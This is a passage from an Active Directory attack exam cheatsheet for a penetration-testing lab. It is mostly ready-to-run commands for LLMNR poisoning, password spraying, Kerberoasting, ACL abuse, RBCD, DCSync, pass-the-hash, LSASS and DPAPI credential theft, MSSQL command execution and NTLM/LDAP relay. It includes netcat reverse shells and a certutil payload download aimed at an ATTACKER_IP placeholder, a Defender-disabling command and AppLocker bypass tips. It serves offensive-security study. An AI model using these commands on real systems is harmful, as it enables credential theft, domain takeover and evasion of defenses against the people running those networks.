# Active Directory Enumeration & Attacks — Exam Cheatsheet

> Full exam reference. Simple attack chains + tool notes for every technique.
> Every tool: what it does, when to use it, why it works.

---

## Lab Access

```bash
ssh htb-student@ATTACK_HOST_IP          # Parrot Linux attack host
# password: HTB_@cademy_stdnt!

xfreerdp /v:MS01_IP /u:htb-student /p:'Academy_student_AD!' /cert:ignore /dynamic-resolution
# Windows attack host (MS01) — use when you need Windows tools
```

---

## The Attack Phases — What To Do In Order

```
Phase 1: No creds  → get a username/hash via Responder or kerbrute enum
Phase 2: Hash      → crack it → get cleartext password
Phase 3: One user  → enumerate AD → find attack paths (BloodHound)
Phase 4: Attack    → Kerberoast, ACL abuse, relay, trust attacks
Phase 5: DA        → DCSync → dump all hashes → full compromise
```

---

## Phase 1 — Get Your First Foothold (No Creds)

### Responder — Passive Hash Capture
**When:** You're on the internal network and need credentials without being detected.
**Why it works:** Windows broadcasts LLMNR/NBT-NS queries for names it can't resolve. Responder answers those broadcasts and Windows automatically sends its credentials.

```bash
sudo responder -I ens224 -wf
# -I ens224 = listen on the INTERNAL interface (not tun0)
# -w = run a fake WPAD proxy server (catches browser auth)
# -f = fingerprint hosts (identify OS)
# Leave running — hashes appear in /usr/share/responder/logs/

# Check captured hashes
ls /usr/share/responder/logs/
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt | head -5

# Crack captured NTLMv2 hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -O
# -m 5600 = NTLMv2 mode
```

### Inveigh — When Responder Misses Users
**When:** A user is on the internal Windows network but authenticates via Kerberos (not NTLM), so Responder doesn't catch them. Run Inveigh on a Windows machine INSIDE the network instead.
**Why it works:** Inveigh runs on a Windows host already inside the broadcast domain — it catches LLMNR/NBT-NS traffic that never reaches the Linux attack host.

```powershell
# On MS01 (or any Windows host you control):
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y -RunTime 5
# -NBNS Y = poison NetBIOS Name Service (catches more traffic than LLMNR alone)
# -ConsoleOutput Y = print hashes to screen as captured
# -FileOutput Y = save hashes to C:\Inveigh-NTLMv2.txt automatically
# -RunTime 5 = run for 5 minutes then stop

# OR use the C# binary (harder to detect):
.\Inveigh.exe
# ESC → interactive console
GET NTLMV2UNIQUE    # unique hashes ready for cracking
GET NTLMV2USERNAMES # see who has authenticated

# Crack the hash on Kali (same as Responder):
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -O
```

### Kerbrute — Username Enumeration Without Creds
**When:** You have no credentials at all but want a valid user list to spray against.
**Why it works:** Kerberos responds differently to valid vs invalid usernames. Kerbrute sends AS-REQ packets and reads the error — no authentication attempt, no lockout.

```bash
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 /opt/jsmith.txt -o valid_users.txt
# -d = target domain
# --dc = domain controller IP
# /opt/jsmith.txt = username wordlist (username permutations)
# -o = save valid users to file for spraying
# Bonus: automatically dumps AS-REP hashes for accounts with no pre-auth required
```

### AS-REP Roasting — No Creds Needed
**When:** You have valid usernames but no password. Some accounts have pre-auth disabled — you can get their hash without knowing their password.
**Why it works:** When pre-auth is disabled, the KDC responds to any AS-REQ with an encrypted blob you can crack offline.

```bash
# From Linux (test your user list):
GetNPUsers.py INLANEFREIGHT.LOCAL/ -usersfile valid_users.txt -no-pass -dc-ip 172.16.5.5 -format hashcat
# Outputs: $krb5asrep$23$... hash for any account with DONT_REQ_PREAUTH set

# Crack:
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt -O
# -m 18200 = AS-REP Roast hash mode

# From Windows (check everyone at once):
.\Rubeus.exe asreproast /format:hashcat /nowrap
```

---

## Phase 2 — First Creds: Enumerate + Spray

### Password Policy — Check BEFORE Spraying
**When:** Every time before you spray. Spraying without knowing the lockout policy can lock out hundreds of accounts.
**Why:** Active Directory locks accounts after X bad attempts. You need to stay under that threshold.

```bash
# With creds (most reliable):
crackmapexec smb DC_IP -u USER -p PASS --pass-pol
# Shows: lockout threshold, lockout duration, min password length, complexity

# Without creds (NULL session — works on misconfigured DCs):
enum4linux -P DC_IP
rpcclient -U "" -N DC_IP   # then type: getdompwinfo

# Rule: if threshold=5, try MAX 3 passwords, then wait for lockout duration
```

### Build a User List
**When:** Before spraying — you need valid usernames to spray against.

```bash
# From LDAP (no creds needed on some DCs):
ldapsearch -H ldap://DC_IP -x -b "DC=inlanefreight,DC=local" "(objectclass=user)" sAMAccountName

# With creds (best — also shows badpwdcount):
crackmapexec smb DC_IP -u USER -p PASS --users
# Check badpwdcount column — skip accounts at 3+ if threshold is 5

# Via kerbrute (no creds):
kerbrute userenum -d DOMAIN --dc DC_IP /opt/jsmith.txt
```

### Password Spraying — Linux
**When:** You have a user list and want to test one password against many accounts.
**Why kerbrute over CME:** Kerbrute uses Kerberos — generates Event 4771 (softer) instead of 4625. CrackMapExec uses SMB — noisier.

```bash
# Kerbrute (stealthiest — Kerberos-based, less logging):
kerbrute passwordspray -d INLANEFREIGHT.LOCAL --dc DC_IP users.txt 'Welcome1'

# CrackMapExec (SMB-based — noisier but confirms local admin):
crackmapexec smb DC_IP -u users.txt -p 'Welcome1' --continue-on-success
# --continue-on-success = don't stop after first hit

# rpcclient spray (one-liner):
for u in $(cat users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" DC_IP | grep Authority; done

# Validate a hit:
crackmapexec smb DC_IP -u FOUND_USER -p FOUND_PASS
# Pwn3d! = local admin on that host
```

### Password Spraying — Windows
**When:** You're on MS01 and need to spray from inside the domain.

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
# Auto-builds user list from AD, auto-checks lockout policy, sprays safely
# -OutFile = save successful credential pairs
```

---

## Phase 3 — Enumerate the Domain (With Creds)

### BloodHound — Map All Attack Paths
**When:** As soon as you have valid credentials. Run it every time — it maps attack paths you'd never find manually.
**Why:** BloodHound builds a graph of every AD relationship (group memberships, ACLs, sessions, delegation) and finds the shortest path to Domain Admin.

```bash
# Collect from Linux (attack host):
bloodhound-python -u USER -p PASS -d INLANEFREIGHT.LOCAL -ns DC_IP -c All
# -ns = nameserver (use DC as DNS so hostnames resolve)
# -c All = collect: users, groups, computers, sessions, ACLs, trusts, GPOs
# Saves multiple .json files

zip -r bh.zip *.json   # compress for GUI upload

# Collect from Windows (if on MS01):
.\SharpHound.exe -c All --zipfilename output.zip
# or:
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp

# Key BloodHound GUI queries (Analysis tab):
# "Find Shortest Paths to Domain Admins"
# "Find Principals with DCSync Rights"
# "Users with Foreign Domain Group Membership"
# "Computers with Unsupported Operating Systems"
# "Map Domain Trusts"
```

### CrackMapExec — Swiss Army Knife
**When:** Quick credential validation, session hunting, share enumeration, remote command execution.

```bash
crackmapexec smb DC_IP -u USER -p PASS --users          # enumerate domain users
crackmapexec smb DC_IP -u USER -p PASS --groups         # enumerate groups
crackmapexec smb DC_IP -u USER -p PASS --shares         # list accessible shares
crackmapexec smb HOST -u USER -p PASS --loggedon-users  # who's logged in? Pwn3d! = local admin
crackmapexec smb HOST -u USER -p PASS -x "whoami"       # run command (need admin)
crackmapexec smb SUBNET/23 -u USER -p PASS              # sweep entire subnet
crackmapexec smb SUBNET/23 -u USER -H NTLM_HASH         # pass-the-hash sweep
crackmapexec winrm HOST -u USER -p PASS                 # test WinRM access
crackmapexec mssql HOST -u USER -p PASS                 # test MSSQL access
```

### PowerView — Deep AD Enumeration (Windows)
**When:** When you need detailed AD object information, ACL enumeration, or want to test specific attack paths from the Windows side.

```powershell
Import-Module .\PowerView.ps1

# Find attack paths:
Find-InterestingDomainAcl                              # finds non-standard ACLs
Get-DomainObjectAcl -Identity USER -ResolveGUIDs       # ACLs on specific object
Find-DomainUserLocation                                # where are admins logged in?
Test-AdminAccess -ComputerName HOST                    # do we have local admin here?

# User enumeration:
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName  # Kerberoastable
Get-DomainUser -UACFilter DONT_REQ_PREAUTH            # AS-REP roastable
Get-DomainUser -UACFilter PASSWD_NOTREQD              # no password required
Get-DomainUser -Properties name,description | Where-Object {$_.description -ne $null}  # passwords in description?

# Group enumeration:
Get-DomainGroupMember -Identity "Domain Admins" -Recurse   # all DA members (incl. nested)
Get-DomainForeignGroupMember -Domain FOREIGN.LOCAL          # cross-domain group members

# Trust enumeration:
Get-DomainTrust                    # direct trusts
Get-DomainTrustMapping             # all trusts (recursive)
```

### Credentialed Enumeration — Linux Tools

```bash
# SMB share spider (find interesting files):
crackmapexec smb DC_IP -u USER -p PASS -M spider_plus --share 'Department Shares'
smbmap -u USER -p PASS -d DOMAIN -H DC_IP -R 'SHARE'   # recursive listing

# LDAP enumeration:
ldapsearch -H ldap://DC_IP -D "USER@DOMAIN" -w PASS -b "DC=domain,DC=local" "(objectclass=user)" sAMAccountName

# Windapsearch (easy LDAP wrapper):
python3 windapsearch.py --dc-ip DC_IP -u USER@DOMAIN -p PASS --da   # domain admins
python3 windapsearch.py --dc-ip DC_IP -u USER@DOMAIN -p PASS -PU    # all privileged

# DNS records via LDAP (adidnsdump — extracts ALL AD-integrated DNS):
adidnsdump -u DOMAIN\\USER -p PASS DC_IP
# Outputs records.csv — see internal hostnames, IPs, find lateral movement targets

# Share pillaging (finds passwords in files):
# Upload Snaffler.exe to MS01 and run:
.\Snaffler.exe -s -d DOMAIN -o snaffler.log -v data
# Finds: web.config files, .bat scripts, unattend.xml, password files, etc.
```

### Security Controls Recon — Check BEFORE Dropping Tools
**When:** Immediately after getting code execution on any Windows host. Tells you what payloads will/won't run and what evasion you need.
**Why:** Running Mimikatz or Rubeus when Defender is on = instant burn. Drop checks first, plan payloads second.

```powershell
# Windows Defender status:
Get-MpComputerStatus | Select RealTimeProtectionEnabled, AntivirusEnabled, AMServiceEnabled
# RealTimeProtection=False → drop signed binaries freely
# True → use AMSI bypass, obfuscation, or LOLBins

# Disable Defender (if you have admin):
Set-MpPreference -DisableRealtimeMonitoring $true

# AppLocker rules (check before dropping executables):
Get-AppLockerPolicy -Effective -XML > applocker.xml
# Look for: <FilePathRule> Allow rules — paths where you CAN execute
# Common allow paths: C:\Windows\Temp, %USERPROFILE%\AppData\Local\Temp
# Workaround: rename payload.exe → cmd.exe or place in allowed path

# PowerShell Constrained Language Mode:
$ExecutionContext.SessionState.LanguageMode
# FullLanguage = OK, anything runs
# ConstrainedLanguage = no .NET, no Add-Type, no Invoke-Expression on objects
# Bypasses: PowerShell v2 (-Version 2), runspaces, or compile to .NET binary

# LAPS deployed?
Get-DomainComputer -Properties 'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime' | Where {$_.'ms-Mcs-AdmPwd'}
# Property visible → you have LAPS read rights → free local admin passwords
# Use: crackmapexec ldap DC_IP -u USER -p PASS -M laps
```

---

## Phase 4 — Attack

### Kerberoasting — Get Service Account Hashes
**When:** There are service accounts with SPNs (SQL, IIS, exchange services). These are your highest-priority targets because service accounts often have weak passwords AND elevated rights.
**Why:** Any authenticated user can request a TGS ticket for any SPN. The ticket is encrypted with the service account's NTLM hash — take it offline and crack.

```bash
# Step 1: Find Kerberoastable accounts (check MemberOf for DA membership!)
GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER:PASS

# Step 2: Get the hashes
GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER:PASS -request -outputfile tgs.txt
# -request = actually pull the TGS tickets (without this, just shows accounts)
# -outputfile = save directly to file (don't copy from terminal — hashes are huge)

# Step 3: Crack
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -O
# -m 13100 = Kerberos TGS-REP etype 23 (RC4) — the common one
# If hash starts with $krb5tgs$18$ use -m 19700 instead (AES-256)

# Windows (Rubeus):
.\Rubeus.exe kerberoast /stats                          # see what's available first
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap   # target admin accounts
.\Rubeus.exe kerberoast /user:TARGET /nowrap             # single account
# /nowrap = don't break the hash across lines (critical — broken hash = won't crack)
```

**Hash length check before cracking:** odd number of hex chars = truncated = won't crack.
```bash
python3 -c "blob='PASTE_HEX_BLOB'; print('OK' if len(blob)%2==0 else 'TRUNCATED')"
```

### Targeted Kerberoasting — Force a Hash from Any User
**When:** A user has no SPN, but you have GenericWrite/GenericAll over their account. Set a fake SPN, Kerberoast them, then clean up.

```powershell
# Step 1: Set a fake SPN on the target (requires GenericWrite or GenericAll on them)
$Cred = New-Object PSCredential('DOMAIN\youruser', (ConvertTo-SecureString 'pass' -AsPlainText -Force))
Set-DomainObject -Credential $Cred -Identity TARGET_USER -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# Step 2: Kerberoast them
.\Rubeus.exe kerberoast /user:TARGET_USER /nowrap
# or:
GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER:PASS -request-user TARGET_USER

# Step 3: CLEAN UP the SPN after (important for real engagements):
Set-DomainObject -Credential $Cred -Identity TARGET_USER -Clear serviceprincipalname -Verbose
```

### RBCD — Resource-Based Constrained Delegation
**When:** You have `GenericWrite`, `GenericAll`, or `WriteDACL` over a computer object (BloodHound: "Find Computers where the Current User has Write Privileges"). Lets you impersonate ANY user (including DA) to that computer.
**Why:** Writing to `msDS-AllowedToActOnBehalfOfOtherIdentity` tells AD to let a controlled service account perform S4U delegation — request tickets as anyone for any service on the target machine.

```bash
# Step 1: Create a fake computer account (any domain user can add up to ms-DS-MachineAccountQuota — default 10)
addcomputer.py -computer-name 'EVILPC$' -computer-pass 'Pwn3d!' -dc-host DC01 \
  -domain-netbios DOMAIN 'DOMAIN/USER:PASS'

# Step 2: Write the fake computer's SID into the target computer's RBCD attribute
rbcd.py -delegate-from 'EVILPC$' -delegate-to 'TARGET_COMP$' -action 'write' \
  'DOMAIN/USER:PASS' -dc-ip DC_IP

# Step 3: S4U2Self + S4U2Proxy — request a ticket as any user (Administrator) for any service on TARGET
getST.py -spn 'cifs/TARGET_COMP.DOMAIN.LOCAL' -impersonate Administrator \
  'DOMAIN/EVILPC$:Pwn3d!' -dc-ip DC_IP

# Step 4: Use the ticket → SYSTEM-equivalent access to TARGET
export KRB5CCNAME=Administrator@cifs_TARGET_COMP.DOMAIN.LOCAL@DOMAIN.LOCAL.ccache
psexec.py -k -no-pass TARGET_COMP.DOMAIN.LOCAL    # interactive SYSTEM shell
wmiexec.py -k -no-pass TARGET_COMP.DOMAIN.LOCAL
secretsdump.py -k -no-pass TARGET_COMP.DOMAIN.LOCAL   # dump SAM/LSA

# Cleanup (clear the RBCD attribute after):
rbcd.py -delegate-to 'TARGET_COMP$' -action 'flush' 'DOMAIN/USER:PASS' -dc-ip DC_IP
```

**From Windows (PowerView + Rubeus):**
```powershell
# Step 1: Add fake computer:
. .\Powermad.ps1
New-MachineAccount -MachineAccount EVILPC -Password $(ConvertTo-SecureString 'Pwn3d!' -AsPlainText -Force)

# Step 2: Get its SID:
$ComputerSid = Get-DomainComputer EVILPC -Properties objectsid | Select -Expand objectsid

# Step 3: Build the security descriptor and write it:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer TARGET_COMP | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Step 4: S4U with Rubeus:
.\Rubeus.exe hash /password:Pwn3d! /user:EVILPC /domain:DOMAIN.LOCAL  # get RC4 hash
.\Rubeus.exe s4u /user:EVILPC$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET_COMP.DOMAIN.LOCAL /ptt
ls \\TARGET_COMP\C$
```

### ACL Abuse — Take Over Other Accounts
**When:** BloodHound shows you have GenericAll, ForceChangePassword, GenericWrite, WriteDACL, or WriteOwner on another account or group.

```powershell
Import-Module .\PowerView.ps1
$Cred = New-Object PSCredential('DOMAIN\youruser', (ConvertTo-SecureString 'pass' -AsPlainText -Force))

# ForceChangePassword (reset without knowing current password):
$NewPass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity TARGET -AccountPassword $NewPass -Credential $Cred

# GenericAll on a GROUP (add yourself as member):
Add-DomainGroupMember -Identity 'Target Group' -Members 'youruser' -Credential $Cred

# GenericWrite on a user (set fake SPN → Kerberoast → crack → use their creds):
Set-DomainObject -Credential $Cred -Identity TARGET -SET @{serviceprincipalname='fake/spn'} -Verbose
# Then Kerberoast TARGET and crack the hash

# WriteDACL on any object (grant yourself any right):
Add-DomainObjectACL -TargetIdentity TARGET -PrincipalIdentity youruser -Rights All -Credential $Cred

# GenericAll on Domain Admins GROUP (add yourself to DA directly):
Add-DomainGroupMember -Identity "Domain Admins" -Members youruser -Credential $Cred
# Verify:
Get-DomainGroupMember -Identity "Domain Admins" | Select MemberName
```

**From Linux (using ldap3 directly):**
```python
import ldap3
server = ldap3.Server('DC_IP', get_info=ldap3.ALL)
conn = ldap3.Connection(server, user='DOMAIN\\USER', password='PASS', authentication=ldap3.NTLM)
conn.bind()
# Add user to group:
conn.modify('CN=Domain Admins,CN=Users,DC=domain,DC=local',
    {'member': [(ldap3.MODIFY_ADD, ['CN=youruser,CN=Users,DC=domain,DC=local'])]})
print(conn.result)
```

### DCSync — Dump All Domain Hashes
**When:** You have Domain Admin rights, or an account with DS-Replication-Get-Changes-All right (check BloodHound → "Find Principals with DCSync Rights").
**Why:** Replicates the AD database just like a second DC would — extracts every account's NTLM hash.

```bash
# From Linux (secretsdump.py):
secretsdump.py DOMAIN/USER:PASS@DC_IP
secretsdump.py DOMAIN/USER:PASS@DC_IP -just-dc-ntlm     # only NTLM hashes (faster)
secretsdump.py DOMAIN/USER:PASS@DC_IP -just-dc-user krbtgt  # single account

# Pass-the-hash variant:
secretsdump.py -hashes :NTLM_HASH DOMAIN/USER@DC_IP

# From Windows (Mimikatz):
.\mimikatz.exe
privilege::debug
lsadump::dcsync /user:DOMAIN\krbtgt          # get krbtgt hash
lsadump::dcsync /user:DOMAIN\Administrator   # get DA hash
lsadump::dcsync /domain:DOMAIN.LOCAL /all    # dump everything

# With explicit creds (useful when your session doesn't have DA but you know DA creds):
lsadump::dcsync /user:Administrator /domain:DOMAIN.LOCAL /authuser:USER /authdomain:DOMAIN /authpassword:PASS
```

### Pass-the-Hash — Use NTLM Without Cracking
**When:** You have an NTLM hash from secretsdump, LSASS dump, or Mimikatz. Use it directly without cracking.
**Why:** Windows NTLM auth only needs the hash — the plaintext is never verified.

```bash
# WinRM (gives PowerShell shell):
evil-winrm -i HOST -u USER -H NTLM_HASH

# SYSTEM shell via PSExec (noisy — writes binary to disk):
psexec.py DOMAIN/USER@HOST -hashes :NTLM_HASH

# User-context shell via WMI (stealthier):
wmiexec.py DOMAIN/USER@HOST -hashes :NTLM_HASH

# Run a single command:
wmiexec.py -hashes :NTLM_HASH DOMAIN/USER@HOST "whoami"

# SMB sweep to find where hash works:
crackmapexec smb SUBNET/24 -u USER -H NTLM_HASH
# Pwn3d! = local admin on that host

# Read a file via SMB admin share:
smbclient -U USER --pw-nt-hash //HOST/C$ NTLM_HASH
# Then: get Users\Administrator\Desktop\flag.txt /tmp/flag.txt
```

### LSASS Dump — Get Credentials from Memory
**When:** You have local admin or SYSTEM on a machine. Dump LSASS to get credentials of any logged-in user.

```bash
# Method 1: comsvcs.dll (built-in Windows, signed, less detection):
# First get LSASS PID:
Get-Process lsass   # or: tasklist | findstr lsass
# Then dump:
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID C:\Windows\Temp\lsass.dmp full
# Requires SYSTEM (use via PrintSpoofer or from elevated session)

# Transfer dump to Linux and parse with pypykatz:
pypykatz lsa minidump lsass.dmp

# Method 2: Mimikatz (requires SeDebugPrivilege):
privilege::debug
sekurlsa::logonpasswords    # cleartext if WDigest enabled, NTLM always
sekurlsa::tickets           # list Kerberos tickets in memory

# Method 3: Remote via secretsdump (if you have admin SMB access):
secretsdump.py DOMAIN/USER:PASS@HOST   # dumps SAM + LSA Secrets
```

### DPAPI — Decrypt Saved Credentials
**When:** You have user-context code execution and want their stored passwords: browser saved logins, RDP/PuTTY cached creds, Wi-Fi passwords, Outlook profiles, mapped drive credentials.
**Why:** Windows DPAPI encrypts these with a key derived from the user's password + master key. Anyone with the user's password (or hash, or DPAPI domain backup key) can decrypt.

**Locations of encrypted blobs:**
```
%APPDATA%\Microsoft\Credentials\           ← Credential Manager
%LOCALAPPDATA%\Microsoft\Credentials\
%APPDATA%\Microsoft\Protect\<SID>\         ← Master keys (named by GUID)
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data   ← Chrome creds (SQLite)
%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt   ← bonus
```

**With user's plaintext password (Linux):**
```bash
# 1. Pull master keys + credentials from target via SMB/wmiexec
# 2. Decrypt master key with user's password:
dpapi.py masterkey -file MASTERKEY_FILE -password USER_PASSWORD
# Outputs the master key hex — save it

# 3. Use master key to decrypt a stored credential:
dpapi.py credential -file CREDENTIAL_FILE -key 0xMASTERKEY_HEX
# Reveals: TargetName, Username, Password
```

**With Mimikatz (Windows):**
```powershell
# Enumerate Credential Manager blobs:
vault::list                                    # all vault credentials
vault::cred /patch                             # decrypt vault entries

# Decrypt user-protected DPAPI blob:
dpapi::cred /in:"C:\Users\USER\AppData\Local\Microsoft\Credentials\BLOB_GUID"
# If you have the master key already in memory (after sekurlsa::logonpasswords), it auto-decrypts

# Get the user's master key:
sekurlsa::dpapi                                # extracts master keys from LSASS

# Decrypt with explicit master key:
dpapi::masterkey /in:MASTERKEY_FILE /password:USER_PASSWORD
dpapi::masterkey /in:MASTERKEY_FILE /sid:USER_SID /password:USER_PASSWORD
```

**Domain Backup Key — Decrypt ANY User's DPAPI Data (DA required to extract):**
```bash
# Step 1: From a DA shell, extract the domain DPAPI backup key:
.\mimikatz.exe "lsadump::backupkeys /system:DC_FQDN /export"
# Saves: ntds_legacy_0_*.pvk file

# Step 2: Use the backup key to decrypt ANY user's master keys (no password needed):
dpapi.py masterkey -file VICTIM_MASTERKEY -pvk DOMAIN_BACKUP.pvk

# This is gold for post-DA persistence — you can decrypt any user's saved creds without their password.
```

**Chrome / Edge browser passwords:**
```powershell
# Mimikatz one-shot (if you have master key):
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect

# SharpChrome (clean output):
.\SharpChrome.exe logins
.\SharpChrome.exe cookies
```

### SAM / Registry Hives — Local Account Hashes
**When:** You have admin on a non-DC machine and want local hashes + LSA Secrets.
**Why:** LSA Secrets can contain service account cleartext passwords, AutoLogon credentials, cached domain hashes.

```bash
# Save hives from target (requires admin):
reg save HKLM\SAM C:\Windows\Temp\sam.hive /y
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive /y
reg save HKLM\SECURITY C:\Windows\Temp\security.hive /y

# Parse on Linux:
secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL
# Look for:
# DefaultPassword = AutoLogon cleartext password (gold!)
# $MACHINE.ACC = machine account password
# Cached domain hashes (DCC2 — hard to crack but confirms users who logged in)

# Crack cached DCC2 hashes:
hashcat -m 2100 dcc2_hash.txt /usr/share/wordlists/rockyou.txt
```

### SeImpersonatePrivilege — SQL/IIS Service to SYSTEM
**When:** You have command execution as a service account (SQL Server, IIS AppPool) with SeImpersonatePrivilege. This is nearly universal on Windows services.
**Why:** Services need to impersonate clients. PrintSpoofer abuses this to impersonate SYSTEM.

```bash
# Check if SeImpersonatePrivilege is enabled:
whoami /priv   # look for SeImpersonatePrivilege = Enabled

# PrintSpoofer (works on Server 2019+):
.\PrintSpoofer.exe -i -c "cmd.exe"         # interactive SYSTEM shell
.\PrintSpoofer.exe -i -c "whoami"          # run single command as SYSTEM
.\PrintSpoofer.exe -c "C:\nc.exe -e cmd.exe ATTACKER_IP PORT"  # reverse shell as SYSTEM

# JuicyPotato (works on older Server versions, needs specific CLSID):
.\JuicyPotato.exe -l 1337 -p C:\nc.exe -a "ATTACKER_IP PORT -e cmd.exe" -t *
```

### MSSQL Abuse
**When:** You have MSSQL credentials (from web.config, password spray, etc.) and want OS command execution.

```bash
# Discover MSSQL instances (PowerUpSQL — best discovery tool):
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain                               # find all SQL servers in AD
Get-SQLConnectionTest -Verbose                       # which ones can we auth to?
Get-SQLServerInfo -Instance HOST                     # version, edition, sysadmin status

# Connect:
mssqlclient.py USER:PASS@HOST                       # SQL auth
mssqlclient.py DOMAIN/USER:PASS@HOST -windows-auth # Windows auth

# Once in:
enable_xp_cmdshell                                  # enable OS command execution
xp_cmdshell whoami                                  # check who we are
xp_cmdshell "certutil -urlcache -split -f http://ATTACKER_IP/tool.exe C:\Windows\Temp\tool.exe"  # download tools
# If SeImpersonatePrivilege → PrintSpoofer → SYSTEM

# NTLM coercion (force target to auth to us → Responder capture):
xp_dirtree \\ATTACKER_IP\share   # forces MSSQL service to auth to us
```

### MSSQL Linked Servers — Pivot Between SQL Instances
**When:** Compromised SQL server has linked server connections to other SQL hosts (often configured for cross-database queries with elevated rights).
**Why:** Linked servers run queries on the remote SQL as a configured account — often `sa` or a privileged service account.

```sql
-- Find linked servers:
SELECT srvname, isremote FROM sys.sysservers

-- Run query on linked server (in mssqlclient.py):
EXECUTE('SELECT @@version') AT [LINKED_SERVER]
EXECUTE('SELECT system_user') AT [LINKED_SERVER]   -- who am I on the linked SQL?

-- Enable xp_cmdshell ON the linked server:
EXECUTE('sp_configure ''show advanced options'', 1; RECONFIGURE; sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER]
EXECUTE('xp_cmdshell ''whoami''') AT [LINKED_SERVER]

-- Chain multiple hops:
EXECUTE('EXECUTE(''xp_cmdshell ''''whoami'''''')  AT [HOP2]') AT [HOP1]
```

### Kerberos Double Hop Problem
**When:** You SSH/WinRM into Host A as a domain user, then try to access Host B from Host A using the same user → access denied even though your creds are valid.
**Why:** WinRM (and other network-auth scenarios) doesn't pass credentials to a third host by default. The user's TGT/TGS doesn't propagate.

```powershell
# Identify the problem:
# - Works locally on Host A (whoami /priv shows correct user)
# - Fails on Host B: "Access is denied" when running commands targeting Host B from Host A

# Workaround 1 — PSCredential Object (re-supply creds explicitly):
$pass = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USER', $pass)
Invoke-Command -ComputerName HOST_B -Credential $cred -ScriptBlock { whoami }
# Or for AD cmdlets:
Get-DomainController -Credential $cred

# Workaround 2 — Register a PSSession config (one-time setup on Host A, requires local admin):
Register-PSSessionConfiguration -Name MyShell -RunAsCredential 'DOMAIN\USER'
Restart-Service WinRM
# Then connect with the saved credential:
Enter-PSSession -ComputerName HOST_A -ConfigurationName MyShell
# Now any command from this session has the creds attached

# Workaround 3 — Use Pass-the-Ticket (avoid the problem entirely):
.\Rubeus.exe asktgt /user:USER /password:PASS /ptt    # inject ticket into current session
# Now everything uses Kerberos — no double-hop issue

# Why RDP doesn't have this problem:
# RDP creates an interactive logon (Type 2). Credentials stay in LSASS on the target,
# so subsequent network access works. WinRM is network logon (Type 3) — no creds cached.
```

### NTLM Relay — No Cracking Needed
**When:** SMB signing is disabled on the target (check: `crackmapexec smb TARGET` → signing:False). Relay instead of crack.
**Why:** Instead of cracking the hash, we forward it to another host and authenticate as the victim.

```bash
# Step 1: Stop Responder's SMB server (ntlmrelayx will handle it):
# Edit /usr/share/responder/Responder.conf → SMB = Off

# Step 2: Start ntlmrelayx (relay to target with no signing):
ntlmrelayx.py -tf targets.txt -smb2support          # get shell/dump SAM
ntlmrelayx.py -tf targets.txt -smb2support -i        # interactive SMB shell
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -c COMMAND"  # execute command

# Step 3: Start Responder to capture and pass hashes to ntlmrelayx:
sudo responder -I ens224 -wf

# Targets.txt = list of IPs with SMB signing disabled
```

**Find relay-able SMB targets:**
```bash
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
# Produces a file of hosts with signing:False — feed straight to ntlmrelayx -tf
```

### LDAP Relay — When SMB Signing Is On But LDAP Isn't
**When:** SMB signing is enforced (you can't SMB-relay) but LDAP signing/channel binding is NOT enforced on the DC. Default until 2023 patches — still common in unpatched environments.
**Why:** LDAP is the management protocol for AD. Relaying an authenticated user's NTLM to LDAP lets you add yourself to groups, set SPNs (Kerberoast), or grant DCSync rights — without ever cracking a hash.

```bash
# Check if LDAP signing is required (and LDAPS channel binding):
crackmapexec ldap DC_IP -u USER -p PASS                              # plain ldap
# Look for: "[+] DOMAIN\USER:PASS" with "Signing:False"
# Or use nmap:
nmap -p 636 --script ldap-bindpolicy DC_IP

# Relay to LDAP (no encryption required):
ntlmrelayx.py -t ldap://DC_IP --escalate-user pwneduser --no-validate-pac
# --escalate-user = grants this user DCSync rights via WriteDACL on domain object

# Relay to LDAPS (TLS) — bypasses signing but blocked by channel binding (EPA):
ntlmrelayx.py -t ldaps://DC_IP --escalate-user pwneduser

# Other ldap relay actions:
ntlmrelayx.py -t ldap://DC_IP --add-computer EVILPC   # add a controlled computer account
ntlmrelayx.py -t ldap://DC_IP --delegate-access -tn TARGET_COMP$   # set up RBCD on a computer

# Trigger with PetitPotam → coerce DC$ → relay to LDAPS → set RBCD on DC → S4U → DA
python3 PetitPotam.py ATTACKER_IP DC_IP
```

**Signing / Channel Binding status — Quick Recon:**
```bash
